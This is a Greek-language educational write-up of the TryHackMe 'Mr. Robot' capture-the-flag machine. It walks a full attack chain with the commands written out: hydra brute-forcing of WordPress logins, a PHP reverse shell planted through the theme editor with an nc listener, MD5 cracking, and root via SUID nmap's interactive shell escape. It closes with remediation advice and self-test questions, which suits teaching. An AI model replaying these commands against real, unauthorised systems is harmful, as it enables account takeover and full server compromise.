# Mr. Robot CTF — Πλήρης Οδηγός Δοκιμής Διείσδυσης

![Mr. Robot CTF](images/img-01.jpg)

Το παρόν έγγραφο είναι ένα αναλυτικό, εκπαιδευτικό εγχειρίδιο δοκιμών διείσδυσης (Penetration Testing Manual) για την εικονική μηχανή **Mr. Robot** της πλατφόρμας TryHackMe. Η δομή ακολουθεί τα διεθνή πρότυπα *Penetration Testing Execution Standard (PTES)* και *NIST SP 800-115*, καλύπτοντας τις φάσεις της αναγνώρισης (Reconnaissance), της απαρίθμησης (Enumeration), της αρχικής πρόσβασης (Initial Access), της πλευρικής μετακίνησης / κλιμάκωσης χρήστη (User Pivoting) και της τελικής κλιμάκωσης προνομίων (Privilege Escalation).

Στόχος της άσκησης είναι ο εντοπισμός τριών συμβολοσειρών ελέγχου (**Key 1, Key 2, Key 3**), που αντιπροσωπεύουν διαβαθμισμένα επίπεδα πρόσβασης. Κάθε εντολή αναλύεται τεχνικά: το πρωτόκολλο, η συμπεριφορά του Linux και ο λόγος για τον οποίο η συγκεκριμένη ενέργεια οδηγεί στο επόμενο βήμα.

**Χάρτης της επίθεσης**

| Φάση | Ενέργεια | Αποτέλεσμα |
| :--- | :--- | :--- |
| 1. Recon | `nmap -sV` | Θύρες 80/443, Apache, WordPress |
| 2. Enumeration | `gobuster`, `robots.txt` | `/wp-login`, `/fsocity.dic`, **Key 1** |
| 3. Credentials | WordPress error messages, Burp, `hydra` | `elliot:ER28-0652` |
| 4. Initial access | Theme Editor → PHP reverse shell | Shell ως `daemon` |
| 5. Pivoting | `password.raw-md5`, CrackStation, `su robot` | **Key 2** |
| 6. Privesc | SUID `nmap`, GTFOBins `!sh` | **Key 3** (root) |

## 1. Εισαγωγή και Μεθοδολογικό Πλαίσιο

Η εναρκτήρια φάση οποιασδήποτε δοκιμής διείσδυσης απαιτεί τον ακριβή προσδιορισμό των ανοιχτών θυρών και των εκτελούμενων υπηρεσιών. Για τον σκοπό αυτό χρησιμοποιείται το `nmap` (Network Mapper).

**Ηθική και νομική διάσταση:** όλες οι τεχνικές εκτελούνται σε μηχάνημα της πλατφόρμας TryHackMe, δηλαδή σε περιβάλλον για το οποίο υπάρχει ρητή άδεια. Η ίδια ακολουθία ενεργειών σε σύστημα τρίτου χωρίς άδεια αποτελεί ποινικό αδίκημα.

### 1.1 Εκτέλεση Εντολής Αναγνώρισης

```bash
nmap <target-ip> -sV -T4 -oA nmap-scan -open
```

Δείγμα εξόδου (όπως εμφανίζεται στο άρθρο):

```text
# 80/tcp  open  http      Apache httpd
# 443/tcp open  ssl/http  Apache httpd
```

![Αποτελέσματα σάρωσης Nmap](images/nmap-scan.png)

*Εικόνα 1 — Η έξοδος του `nmap`: μόνο οι θύρες 80 (HTTP) και 443 (HTTPS) είναι ανοιχτές, με Apache httpd.*

### 1.2 Επιστημονική και Τεχνική Ανάλυση της Εντολής

Η εντολή `nmap` αποτελεί το πρότυπο εργαλείο ανάλυσης δικτυακών καταστάσεων και συλλογής πληροφοριών σε επίπεδο ζεύξης, μεταφοράς και εφαρμογής (OSI Layers 4 & 7). Η παράμετρος `<target-ip>` καθορίζει τη διεύθυνση IPv4 του υπό εξέταση κόμβου.

Η σημαία `-sV` (*Version Detection*) ενεργοποιεί την εξέταση εκδόσεων υπηρεσιών. Αντί να βασίζεται στον καθιερωμένο συσχετισμό αριθμού θύρας–υπηρεσίας (IANA), το nmap αποστέλλει εξειδικευμένα ερωτήματα (probes), αναλύει τα banners και αντιπαραβάλλει τις υπογραφές με τη βάση `nmap-service-probes` για να ταυτοποιήσει με ακρίβεια την έκδοση (π.χ. Apache httpd).

Η παράμετρος `-T4` (*Timing Template: Aggressive*) προσαρμόζει τις χρονικές παραμέτρους, μειώνοντας τα timeouts αναμονής (RTT) και αυξάνοντας τον ρυθμό αποστολής πακέτων. Είναι κατάλληλη για αξιόπιστα εργαστηριακά δίκτυα· σε δημόσια δίκτυα προκαλεί θόρυβο και αποτυχίες.

Η σημαία `-open` λειτουργεί ως φίλτρο εξόδου, ώστε να εμφανίζονται μόνο θύρες σε κατάσταση ακρόασης (LISTEN) και να αγνοούνται οι κλειστές (closed) ή φιλτραρισμένες (filtered).

Τέλος, η `-oA nmap-scan` εξάγει τα ευρήματα σε τρεις μορφές ταυτόχρονα: κανονικό κείμενο (`.nmap`), XML (`.xml`) και μορφή για grep (`.gnmap`). Η πρακτική είναι κρίσιμη για την τήρηση ψηφιακών αποδείξεων (audit trail) και την τροφοδοσία εργαλείων ανάλυσης.

> **Γιατί έχει σημασία:** μόλις δύο θύρες είναι ανοιχτές, η επιφάνεια επίθεσης περιορίζεται **αποκλειστικά** στην web εφαρμογή. Δεν υπάρχει SSH ή FTP για να δοκιμάσουμε αδύναμους κωδικούς· όλη η δουλειά θα γίνει μέσω HTTP/HTTPS.

### 1.3 Η αρχική ιστοσελίδα

![Αρχική ιστοσελίδα του Mr. Robot](images/img-02.png)

*Εικόνα 2 — Η αρχική σελίδα του στόχου στην πύλη 80: διαδραστικό «παιχνίδι» τερματικού, χωρίς προφανή στοιχεία.*

## 2. Απαρίθμηση Υπηρεσιών Ιστού (Web Enumeration)

Μετά την επιβεβαίωση διακομιστή HTTP, απαιτείται η ανάλυση της δομής του ιστότοπου και ο εντοπισμός μη ευρετηριασμένων πόρων (forced browsing / directory brute-forcing).

### 2.1 Εκτέλεση Εντολής Απαρίθμησης Καταλόγων

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

![Αποτελέσματα Gobuster και σελίδα /wp-login](images/img-03.png)

*Εικόνα 3 — Το Gobuster επιστρέφει πολλές ανακατευθύνσεις (301) αλλά και δύο κρίσιμες διαδρομές: `/wp-login` και `/robots`.*

### 2.2 Επιστημονική και Τεχνική Ανάλυση της Εντολής

Το `gobuster` είναι εργαλείο υψηλής απόδοσης γραμμένο σε **Go**, σχεδιασμένο για παράλληλη εκτέλεση αιτημάτων HTTP/HTTPS με σκοπό την αποκάλυψη κρυφών διαδρομών (URIs) και DNS subdomains. Η υπο-εντολή `dir` ενεργοποιεί τη λειτουργία σάρωσης καταλόγων: εκτελεί διαδοχικά αιτήματα GET/HEAD για κάθε λέξη του λεξικού, προσαρτώντας την στη βασική URL.

Η σημαία `-u` δηλώνει το σημείο εισόδου (Base Target URL) και η `-w` το λεξικό `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`, που περιέχει στατιστικά συχνές διαδρομές πραγματικών συστημάτων. Το εργαλείο αξιολογεί τους κωδικούς απόκρισης: `200 OK` ή `301/302` υποδηλώνουν ύπαρξη πόρου, ενώ `404 Not Found` απορρίπτεται.

Η χρήση της Go παρέχει πολυνηματική αρχιτεκτονική μέσω **goroutines**, επιτρέποντας εκατοντάδες αιτήματα ανά δευτερόλεπτο με ελάχιστη κατανάλωση πόρων.

> **Πώς διαβάζουμε τα αποτελέσματα:** τα `301 Moved Permanently` σε `/wp-content`, `/wp-includes` κ.λπ. δεν είναι «τυχαία» — δηλώνουν δομή **WordPress**. Το `/wp-login` επιβεβαιώνει το CMS και μας δίνει φόρμα αυθεντικοποίησης, δηλαδή σημείο επίθεσης.

### 2.3 Ανάλυση του `robots.txt` και Ανάκτηση του Key 1

![Περιεχόμενο του robots.txt](images/img-04.png)

*Εικόνα 4 — Το `/robots.txt` αποκαλύπτει δύο καταχωρίσεις: `/fsocity.dic` και `/key-1-of-3.txt`.*

Το `/robots.txt` προορίζεται για την καθοδήγηση των αυτόματων ανιχνευτών (crawlers) μέσω του **Robots Exclusion Protocol**. Είναι **δημόσιο** αρχείο: ό,τι γράφεται εκεί είναι ορατό σε οποιονδήποτε.

```text
User-agent: *
Disallow: /fsocity.dic
Disallow: /key-1-of-3.txt
```

Αποκαλύπτονται δύο διαδρομές:

1. `key-1-of-3.txt` — η απευθείας ανάγνωση μέσω browser επιστρέφει το **Key 1**.
2. `fsocity.dic` — αρχείο λεξικού με πιθανά ονόματα χρηστών/κωδικών.

> **Γιατί είναι σοβαρό σφάλμα:** το `robots.txt` είναι «χάρτης θησαυρού» για επιτιθέμενους. Αποκαλύπτει ακριβώς ό,τι θέλει να κρύψει ο διαχειριστής. Σωστή πρακτική: **μην** τοποθετείτε ευαίσθητους πόρους εκεί και προστατεύστε τους με authentication, όχι με «απόκρυψη».

### 2.4 Το λεξικό `fsocity.dic`

![Περιεχόμενο του fsocity.dic](images/img-05.png)

*Εικόνα 5 — Το αρχείο είναι λίστα λέξεων με χιλιάδες διπλότυπα, προφανώς φτιαγμένη για brute-force.*

Κατεβάζοντας το αρχείο:

```bash
wget http://<target-ip>/fsocity.dic
```

Περιέχει **858.160** λέξεις, με συντριπτική πλειονότητα διπλότυπα. Είναι δηλαδή έτοιμο λεξικό για επίθεση σε κωδικούς — αλλά και, όπως θα δούμε, για ονόματα χρηστών.

## 3. Επεξεργασία Δεδομένων και Επίθεση Λεξικού

### 3.1 Βελτιστοποίηση Λεξικού μέσω Unix Pipeline

```bash
wc -w fsocity.dic                    # 858160
sort fsocity.dic | uniq -d > fs-list # γράφει τις επαναλαμβανόμενες λέξεις
sort fsocity.dic | uniq -u >> fs-list # προσθέτει τις μοναδικές
wc -w fs-list                        # 11451
```

### 3.2 Επιστημονική και Τεχνική Ανάλυση των Εντολών

Η `wc` (*word count*) με `-w` μετρά λέξεις. Η αρχική μέτρηση είναι 858.160.

Η **διοχέτευση** (`|`) συνδέει την έξοδο (stdout) μιας διεργασίας απευθείας με την είσοδο (stdin) της επόμενης, στη μνήμη, χωρίς ενδιάμεσο αρχείο.

Η `sort` αναδιατάσσει τις γραμμές λεξικογραφικά (ASCII). Η ταξινόμηση είναι **αυστηρή προϋπόθεση** για το `uniq`, το οποίο συγκρίνει μόνο **γειτονικές** γραμμές — χωρίς `sort`, διπλότυπα που δεν γειτονεύουν δεν εντοπίζονται.

Η `uniq -d` (*duplicate*) κρατά μόνο όσες εμφανίζονται >1 φορά και το `>` γράφει στο `fs-list`. Η `uniq -u` (*unique*) κρατά όσες ήταν εξαρχής μοναδικές και το `>>` τις **προσαρτά** στο τέλος.

Το τελικό `wc -w` δείχνει **11.451** εγγραφές: μείωση **98,6%**, άρα και αντίστοιχη μείωση χρόνου brute-force.

> **Σημείωση ακρίβειας:** το ζεύγος `uniq -d` + `uniq -u` παράγει μία εγγραφή ανά *διακριτή* λέξη, αλλά με διαφορετική σειρά από ένα απλό `sort -u`. Πιο απλό και ισοδύναμο σε πλήθος είναι `sort -u fsocity.dic > fs-list`. Εδώ ακολουθούμε την προσέγγιση του άρθρου για λόγους συνέπειας.

### 3.3 Απαρίθμηση Χρηστών μέσω Διαφορετικών Μηνυμάτων Σφάλματος

![Μήνυμα σφάλματος για άκυρο χρήστη](images/img-06.jpg)

*Εικόνα 6 — Αποτυχημένη σύνδεση με τυχαία διαπιστευτήρια: «ERROR: Invalid username».*

![Καταγραφή αιτήματος στο Burp Suite](images/img-07.png)

*Εικόνα 7 — Το ίδιο αίτημα μέσω Burp Proxy: γραμμή 15, μέθοδος POST προς `/wp-login.php`.*

![Παράμετροι του POST](images/img-08.png)

*Εικόνα 8 — Οι παράμετροι του POST είναι `log` και `pwd`.*

Το WordPress επιστρέφει **διαφορετικό** μήνυμα ανάλογα με το αν ο χρήστης υπάρχει:

| Περίπτωση | Μήνυμα |
| :--- | :--- |
| Ανύπαρκτος χρήστης | `ERROR: Invalid username.` |
| Υπαρκτός χρήστης, λάθος κωδικός | `The password you entered for the username … is incorrect.` |

Αυτή η διαφορά είναι **User Enumeration** (CWE-204: Observable Response Discrepancy). Επιτρέπει σε επιτιθέμενο να διαπιστώσει ποιοι λογαριασμοί υπάρχουν, χωρίς να μαντέψει κωδικούς.

**Γιατί χρειαζόμαστε το Burp:** για να μάθουμε το **ακριβές** σώμα του POST (`log=…&pwd=…`) και το path (`/wp-login.php`), ώστε να το δώσουμε στη Hydra.

### 3.4 Απόκτηση Έγκυρου Ονόματος Χρήστη (Hydra)

```bash
hydra -L fs-list -p test <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

![Επιτυχής απαρίθμηση χρήστη](images/img-09.png)

*Εικόνα 9 — Η Hydra εντοπίζει έγκυρο λογαριασμό: `elliot`.*

**Ανάλυση:**

* `-L fs-list` — λίστα **χρηστών** (κεφαλαίο L = file). Το πεζό `-l` δίνει ένα μόνο όνομα.
* `-p test` — σταθερός κωδικός· δεν μας νοιάζει ο κωδικός, μόνο η ύπαρξη χρήστη.
* `http-post-form` — μονάδα για φόρμες POST.
* `/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username` — τρία μέρη χωρισμένα με `:`: path, σώμα με placeholders, **συνθήκη αποτυχίας**.
* `F=…` — αν η απάντηση περιέχει «Invalid username», η προσπάθεια θεωρείται αποτυχημένη· αν **όχι**, ο χρήστης είναι έγκυρος.
* `-t 30` — 30 παράλληλες εργασίες (προεπιλογή 16).

> **Γιατί 30 και όχι 300:** πολύ υψηλός παραλληλισμός μπορεί να ρίξει τον Apache, να ενεργοποιήσει rate limiting ή να αλλοιώσει τα αποτελέσματα. Σε πραγματικό engagement υπάρχει πάντα όριο από το scope.

### 3.5 Εύρεση Κωδικού Πρόσβασης

![Μήνυμα σφάλματος για έγκυρο χρήστη](images/img-10.jpg)

*Εικόνα 10 — Το μήνυμα άλλαξε: «The password you entered for the username elliot is incorrect» — άρα ο χρήστης υπάρχει.*

```bash
hydra -l elliot -P fs-list <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

![Επιτυχής ανάκτηση κωδικού](images/img-11.png)

*Εικόνα 11 — Επιτυχία: `elliot:ER28-0652`.*

**Οι διαφορές από την προηγούμενη εντολή:** `-l elliot` (πεζό = ένα όνομα) και `-P fs-list` (κεφαλαίο = λίστα κωδικών). Η συνθήκη αποτυχίας γίνεται το νέο μήνυμα. Με τον σωστό κωδικό, ο διακομιστής επιστρέφει `302` προς `wp-admin` και η Hydra σταματά.

> **Γιατί δουλεύει τόσο γρήγορα:** ο κωδικός `ER28-0652` υπάρχει στο `fsocity.dic` — δηλαδή ο «επιτιθέμενος» είχε ήδη το κλειδί, επειδή ο διαχειριστής άφησε το λεξικό του δημόσιο.

## 4. Απόκτηση Αρχικής Πρόσβασης (Initial Access via Reverse Shell)

Ως διαχειριστής, ο χρήστης έχει πρόσβαση στο **Theme Editor** (`Appearance → Editor`), που επιτρέπει την απευθείας τροποποίηση των αρχείων του θέματος. Πρόκειται για λειτουργία που, σε παραγωγικά συστήματα, πρέπει να είναι **απενεργοποιημένη** (`DISALLOW_FILE_EDIT` στο `wp-config.php`).

### 4.1 Το Theme Editor

![Theme Editor του WordPress](images/img-13.png)

*Εικόνα 13 — `Appearance → Editor`: δεξιά η λίστα προτύπων του θέματος Twenty Fifteen, με το `Archives (archive.php)` διαθέσιμο προς επεξεργασία.*

### 4.2 Ο κώδικας του reverse shell

![pentestmonkey PHP reverse shell](images/img-14.png)

*Εικόνα 14 — Το γνωστό `pentestmonkey/php-reverse-shell` στο GitHub· πρέπει να αντιγραφεί η έκδοση «Raw».*

Ο κώδικας αντικαθιστά το περιεχόμενο του `archive.php`. Οι μόνες αλλαγές που απαιτούνται είναι δύο μεταβλητές:

![Τροποποίηση των $ip και $port](images/img-15.png)

*Εικόνα 15 — `$ip = <η IP μας>;` και `$port = 1234;` — οι υπόλοιπες γραμμές μένουν ως έχουν.*

**Πώς λειτουργεί ο κώδικας (με απλά λόγια):**

1. Ανοίγει TCP socket προς `$ip:$port` (`fsockopen`).
2. Δημιουργεί διεργασία `/bin/sh -i` (`proc_open`).
3. Συνδέει stdin/stdout/stderr της διεργασίας με το socket (`dup2`).
4. Από εκείνη τη στιγμή, ό,τι γράφουμε στο `nc` εκτελείται στον server.

> **Γιατί λειτουργεί:** ο Apache εκτελεί PHP με τα δικαιώματα του χρήστη της υπηρεσίας (`daemon` εδώ). Δεν χρειάζεται κάποια «ευπάθεια λογισμικού» — αρκεί η δυνατότητα **εγγραφής κώδικα** από εξουσιοδοτημένο χρήστη. Είναι παράδειγμα κατάχρησης λειτουργίας (feature abuse).

### 4.3 Εκτέλεση Ακροατή και Λήψη του Shell

```bash
nc -lnvp 1234
```

![Λήψη reverse shell](images/img-16.png)

*Εικόνα 16 — Ο ακροατής δέχεται τη σύνδεση και αποκτούμε shell ως `daemon`.*

**Ανάλυση της `nc`:**

* `-l` (listen) — λειτουργία εξυπηρετητή (server socket).
* `-n` — χωρίς reverse DNS (ταχύτητα, λιγότερα ίχνη).
* `-v` — αναλυτική έξοδος.
* `-p 1234` — θύρα ακρόασης.

Η εκτέλεση ενεργοποιείται με την επίσκεψη στο:

```text
http://<target-ip>/wp-content/themes/twentyfifteen/archive.php
```

> **Σημείωση:** το shell είναι «dumb» — χωρίς PTY, χωρίς job control. Αυτό θα μας εμποδίσει αργότερα στο `su`, και γι' αυτό θα χρειαστεί `pty.spawn`.

## 5. Πλευρική Μετακίνηση και Σπάσιμο Κατακερματισμού (User Pivoting)

### 5.1 Εντοπισμός του Key 2 και του hash

![Αρχεία στο /home/robot](images/img-17.png)

*Εικόνα 17 — Στο `/home/robot`: `key-2-of-3.txt` με δικαιώματα `-r--------` (μόνο ο `robot`) και `password.raw-md5`.*

```bash
ls -la /home/robot
cat /home/robot/password.raw-md5
```

Το `key-2-of-3.txt` έχει δικαιώματα `400` και **δεν** διαβάζεται από τον `daemon`. Το `password.raw-md5` όμως είναι αναγνώσιμο και περιέχει MD5 hash του κωδικού του `robot`.

> **Γιατί ο MD5 είναι ακατάλληλος για κωδικούς:** είναι ταχύτατος, χωρίς salt. Ένα σύγχρονο σύστημα υπολογίζει **δισεκατομμύρια** MD5/δευτερόλεπτο, ενώ υπάρχουν έτοιμοι πίνακες (rainbow tables) για τα συνηθέστερα hashes. Ο σωστός αλγόριθμος είναι **bcrypt/Argon2/scrypt** με salt.

### 5.2 Σπάσιμο του hash

![CrackStation](images/img-18.png)

*Εικόνα 18 — Αναζήτηση του hash στο CrackStation: το αποτέλεσμα είναι `abcdefghijklmnopqrstuvwxyz`.*

Η online βάση επιστρέφει αμέσως το plaintext, γιατί το hash βρίσκεται ήδη σε κάποια διαρρεύσα λίστα. Εναλλακτικά, τοπικά:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### 5.3 Αναβάθμιση Κελύφους σε Διαδραστικό TTY

![Αποτυχία su σε μη διαδραστικό κέλυφος](images/img-19.png)

*Εικόνα 19 — `su: must be run from a terminal`: το Linux αρνείται την αυθεντικοποίηση χωρίς PTY.*

![Εκκίνηση bash μέσω Python](images/img-20.png)

*Εικόνα 20 — `python -c 'import pty; pty.spawn("/bin/bash")'`· πλέον το `su robot` λειτουργεί και διαβάζεται το Key 2.*

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su robot        # κωδικός: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

**Ανάλυση:**

* `python -c` εκτελεί κώδικα απευθείας από τη γραμμή εντολών.
* Η `pty` παρέχει διεπαφές για **ψευδο-τερματικά** (pseudo-terminals) του πυρήνα.
* Η `pty.spawn("/bin/bash")` δημιουργεί νέα διεργασία bash συνδεδεμένη με ζεύγος master/slave PTY — δηλαδή εξομοιώνει φυσικό τερματικό.
* Έτσι υποστηρίζονται σήματα (`Ctrl+C`), `job control` και εντολές που απαιτούν `/dev/tty` (όπως το `su`).

Εναλλακτικά, πλήρης σταθεροποίηση:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, μετά τοπικά: stty raw -echo; fg
export TERM=xterm
```

## 6. Τοπική Κλιμάκωση Προνομίων (Privilege Escalation)

### 6.1 Εντοπισμός Εκτελέσιμων SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

![Αναζήτηση SUID binaries](images/img-21.png)

*Εικόνα 21 — Στη λίστα εμφανίζεται το μη αναμενόμενο `/usr/local/bin/nmap`.*

**Ανάλυση:**

* `/` — σημείο εκκίνησης η ρίζα του συστήματος αρχείων.
* `-perm -u=s` — αρχεία με ενεργό το **SUID** bit για τον ιδιοκτήτη (`-4000`).
* `-type f` — μόνο κανονικά αρχεία.
* `2>/dev/null` — αποσιώπηση των «Permission denied».

**Τι είναι το SUID:** όταν εκτελεστεί ένα τέτοιο αρχείο, η διεργασία αποκτά **Effective User ID** του ιδιοκτήτη (εδώ `root`), ανεξάρτητα από ποιος το καλεί. Είναι απαραίτητο για το `passwd`, το `ping`, το `su` — αλλά **καταστροφικό** όταν αποδίδεται σε εργαλείο γενικής χρήσης.

### 6.2 Εκμετάλλευση μέσω GTFOBins

![GTFOBins — nmap](images/img-22.png)

*Εικόνα 22 — Το GTFOBins τεκμηριώνει ότι παλιές εκδόσεις του nmap (2.02–5.21) διαθέτουν `--interactive` με δυνατότητα διαφυγής σε shell (`!sh`).*

![Root shell μέσω nmap](images/img-23.png)

*Εικόνα 23 — `/usr/local/bin/nmap --interactive` και μετά `!sh`: `whoami` επιστρέφει `root`.*

```bash
/usr/local/bin/nmap --interactive
# εντός της κονσόλας nmap:
!sh
```

**Γιατί δουλεύει:** η παράμετρος `--interactive` ενεργοποιεί διαδραστική κονσόλα· η εντολή `!sh` εκτελεί `/bin/sh` μέσω `system()`. Επειδή το binary είναι SUID root, το θυγατρικό shell κληρονομεί **EUID 0**.

> **Παγίδα που πρέπει να θυμάστε:** η πλήρης διαδρομή (`/usr/local/bin/nmap`) είναι απαραίτητη. Αν γράψετε σκέτο `nmap`, το shell μπορεί να βρει διαφορετικό εκτελέσιμο (χωρίς SUID) μέσω `$PATH` — και η κλιμάκωση αποτυγχάνει.

### 6.3 Το τελικό κλειδί

![Ανάκτηση του Key 3](images/img-24.png)

*Εικόνα 24 — Ανάγνωση του `/root/key-3-of-3.txt`: ολοκληρώνεται η διαδρομή από `daemon` σε `root`.*

```bash
cat /root/key-3-of-3.txt
```

## 7. Εναλλακτικές Τεχνικές

Η διεξαγωγή δοκιμών διείσδυσης απαιτεί ευελιξία: συχνά υπάρχουν πολλαπλοί δρόμοι για το ίδιο αποτέλεσμα, και η επιλογή εξαρτάται από τα διαθέσιμα εργαλεία, τον χρόνο και τον θόρυβο που επιτρέπεται.

### 7.1 Επίθεση Λεξικού μέσω Burp Suite Intruder

![Αποστολή αιτήματος στο Intruder](images/img-25.png)

*Εικόνα 25 — Δεξί κλικ στο αίτημα → «Send to Intruder» (ή `Ctrl+I`).*

![Ορισμός δεικτών](images/img-26.png)

*Εικόνα 26 — Στο tab Positions: `log=elliot` σταθερό, `pwd=§test§` ως payload position.*

![Φόρτωση λεξικού](images/img-27.jpg)

*Εικόνα 27 — Στο tab Payloads φορτώνεται το `fs-list`.*

![Αποτελέσματα Intruder](images/img-28.png)

*Εικόνα 28 — Ταξινόμηση κατά Length: η επιτυχής προσπάθεια ξεχωρίζει (302 + διαφορετικό μήκος).*

**Πλεονέκτημα:** γραφικό περιβάλλον, εύκολη ανάλυση αποκρίσεων.
**Μειονέκτημα:** η Community έκδοση έχει **rate limiting** — η επίθεση μπορεί να διαρκέσει υπερβολικά.

### 7.2 Επίθεση μέσω WPScan

```bash
wpscan --url http://<target-ip> -t 50 -U elliot -P fs-list
```

![WPScan](images/img-29.png)

*Εικόνα 29 — Το WPScan επιβεβαιώνει τα διαπιστευτήρια του `elliot`.*

**Ανάλυση:** το `wpscan` είναι εξειδικευμένος scanner WordPress· αναγνωρίζει εγγενώς τη δομή της φόρμας και των μηνυμάτων, οπότε **δεν** χρειάζεται `F=…`. Αν το `xmlrpc.php` είναι ενεργό, μπορεί να χρησιμοποιήσει multi-call και να μειώσει δραστικά τα requests. Το `-t 50` ορίζει 50 νήματα.

### 7.3 Σπάσιμο με John the Ripper

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![John the Ripper](images/img-30.png)

*Εικόνα 30 — Επιτυχής ανάκτηση του plaintext με λεξικό.*

Η `--format=Raw-MD5` δηλώνει ρητά αλγόριθμο χωρίς salt· χωρίς αυτήν, το John δοκιμάζει αυτόματα formats (πιο αργό). Το `rockyou.txt` περιέχει >14 εκατομμύρια πραγματικούς κωδικούς.

### 7.4 Σπάσιμο με Hashcat

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![Hashcat](images/img-31.png)

*Εικόνα 31 — Το Hashcat με `-m 0` (MD5) ολοκληρώνει σε ελάχιστο χρόνο.*

Το `-m 0` είναι ο κωδικός μορφής για MD5. Το Hashcat αξιοποιεί **GPU** (CUDA/OpenCL) και φτάνει σε ταχύτητες δισεκατομμυρίων hashes/δευτερόλεπτο — γι' αυτό ο MD5 θεωρείται «σπασμένος» για κωδικούς.

## 8. Συνοπτικός Πίνακας Ευρημάτων και Συμπεράσματα

| Φάση | Εργαλείο / Τεχνική | Ευπάθεια / Μηχανισμός | Αποτέλεσμα |
| :--- | :--- | :--- | :--- |
| **Αναγνώριση** | `nmap` | Έκθεση HTTP/HTTPS | Ταυτοποίηση Apache & WordPress |
| **Απαρίθμηση** | `gobuster` | Μη ευρετηριασμένοι πόροι | `/wp-login`, `/robots.txt` |
| **Διαρροή πληροφορίας** | `robots.txt` | Αποκάλυψη κρυφών διαδρομών | **Key 1** + λεξικό `fsocity.dic` |
| **User enumeration** | WordPress error messages | Διαφορετικό μήνυμα ανά περίπτωση (CWE-204) | Έγκυρο username `elliot` |
| **Brute-force** | `hydra` | Αδύναμος κωδικός από δημόσιο λεξικό | `elliot:ER28-0652` |
| **Αρχική πρόσβαση** | Theme Editor + PHP reverse shell | Δυνατότητα επεξεργασίας PHP από admin | Shell ως `daemon` |
| **Pivoting** | MD5 cracking + `pty.spawn` | Αδύναμος/χωρίς salt hash | Χρήστης `robot`, **Key 2** |
| **Privesc** | SUID `nmap` + GTFOBins | Λάθος δικαιώματα σε εργαλείο γενικής χρήσης | `root`, **Key 3** |

**Αξιολόγηση κινδύνου:** η μηχανή παρουσιάζει **αποτυχία άμυνας σε βάθος** (defense-in-depth failure): κανένα μεμονωμένο λάθος δεν θα αρκούσε, αλλά η αλυσίδα τους οδήγησε σε πλήρη κατάληψη.

### 8.1 Προτεινόμενα Μέτρα Αποκατάστασης

1. **Αφαίρεση ευαίσθητων καταχωρίσεων από το `robots.txt`** και προστασία αρχείων με authentication, όχι «απόκρυψη».
2. **Ομοιόμορφα μηνύματα σφάλματος** στη φόρμα σύνδεσης («Invalid username or password») ώστε να μην επιτρέπεται enumeration.
3. **Rate limiting / lockout** στη `wp-login.php` και 2FA για διαχειριστές.
4. **`DISALLOW_FILE_EDIT`** στο `wp-config.php` — απενεργοποίηση του Theme/Plugin Editor.
5. **Ισχυροί κωδικοί** και απαγόρευση χρήσης λεξικών· έλεγχος με `john`/`hashcat` σε εσωτερικό audit.
6. **Σύγχρονο hashing** (bcrypt/Argon2) αντί για MD5.
7. **Αφαίρεση SUID** από εργαλεία που δεν το χρειάζονται (`chmod u-s /usr/local/bin/nmap`) και τακτικός έλεγχος με `find / -perm -4000`.
8. **WAF** με κανόνες για brute-force και **monitoring** αποτυχημένων συνδέσεων.
9. **Ελάχιστα προνόμια:** ο web user δεν πρέπει να έχει πρόσβαση σε αρχεία άλλων χρηστών (`/home/robot`).

| **Enumeration** | Συστηματική απαρίθμηση πόρων (χρήστες, διαδρομές, εκδόσεις) |
| **Forced browsing** | Δοκιμή γνωστών/πιθανών διαδρομών |
| **User enumeration** | Διάκριση έγκυρων λογαριασμών από μηνύματα σφάλματος |
| **Reverse shell** | Ο στόχος συνδέεται πίσω στον επιτιθέμενο |
| **PTY** | Ψευδο-τερματικό· απαραίτητο για `su`, `sudo`, editors |
| **SUID** | Εκτέλεση με δικαιώματα ιδιοκτήτη του αρχείου |
| **EUID** | Effective User ID — τα πραγματικά δικαιώματα της διεργασίας |
| **GTFOBins** | Κατάλογος τεχνικών κατάχρησης νόμιμων binaries |
| **Rainbow table** | Προϋπολογισμένος πίνακας hash → plaintext |
| **Salt** | Τυχαία τιμή που καθιστά κάθε hash μοναδικό |

## Παράρτημα Β — Ερωτήσεις αυτοελέγχου

1. Γιατί το `robots.txt` θεωρείται διαρροή πληροφορίας και όχι μέτρο ασφάλειας;
2. Πώς μετατρέπεται η διαφορά δύο μηνυμάτων σφάλματος σε επίθεση brute-force;
3. Ποια η διαφορά `-l` και `-L` (και `-p` / `-P`) στη Hydra;
4. Γιατί χρειάζεται `sort` πριν το `uniq`;
5. Γιατί το `su` αποτυγχάνει σε reverse shell χωρίς PTY;
6. Εξηγήστε γιατί ένα SUID `nmap` οδηγεί σε root, ενώ ένα SUID `passwd` δεν είναι (τόσο) επικίνδυνο.
7. Γιατί ο MD5 δεν πρέπει να χρησιμοποιείται για αποθήκευση κωδικών; Τι το αντικαθιστά;
8. Ποια **τρία** μέτρα θα σταματούσαν την αλυσίδα και σε ποιο στάδιο;

## Παράρτημα Γ — Λίστα ελέγχου

- [ ] Σάρωση θυρών με εκδόσεις (`-sV`) και εξαγωγή σε αρχείο
- [ ] Απαρίθμηση καταλόγων με λεξικό
- [ ] Έλεγχος `robots.txt`, `sitemap.xml`, πηγαίου κώδικα
- [ ] Καταγραφή αιτημάτων σύνδεσης μέσω proxy
- [ ] Έλεγχος διαφορών στα μηνύματα σφάλματος (enumeration)
- [ ] Βελτιστοποίηση λεξικών πριν το brute-force
- [ ] Έλεγχος δικαιωμάτων αρχείων σε home directories
- [ ] Έλεγχος hashes με rainbow tables / john / hashcat
- [ ] Σταθεροποίηση shell (PTY) πριν από `su`/`sudo`
